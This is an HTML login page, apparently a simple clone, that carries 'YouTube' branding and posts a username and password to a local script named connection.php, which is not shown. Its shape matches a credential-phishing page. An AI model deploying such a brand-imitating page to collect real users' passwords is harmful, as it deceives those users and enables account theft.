<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign up form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        body {
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }

        .login-container {
            border: 1px solid #ddd;
            border-radius: 8px;
            width: 360px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            background-color: #fff;
        }

        .youtube-logo {
            font-size: 28px;
            font-weight: bold;
            color: #ff0000;
        }

        .login-form {
            margin-top: 20px;
        }

        .login-form h2 {
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 600;
        }

        .form-preview {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-preview label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            font-weight: 500;
        }

        .form-preview input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-button {
            padding: 12px;
            background-color: #ff0000;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            font-weight: bold;
        }

        .login-button:hover {
            background-color: #e60000;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="youtube-logo">
            YouTube
        </div>
        <form method="post" action="connection.php" class="login-form" onsubmit="return handleLogin(event)">
            <h2>Login</h2>
            <div class="form-preview">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username">
            </div>
            <div class="form-preview">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password">
            </div>
            <div id="error-message" class="error"></div>
            <button type="submit" class="login-button">Login</button>
        </form>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorMessage = document.getElementById('error-message');
            if (username === '' || password === '') {
                errorMessage.textContent = 'Please fill out all fields.';
                return false;
            }
            errorMessage.textContent = '';
            event.target.submit();
        }
    </script>

</body>

</html>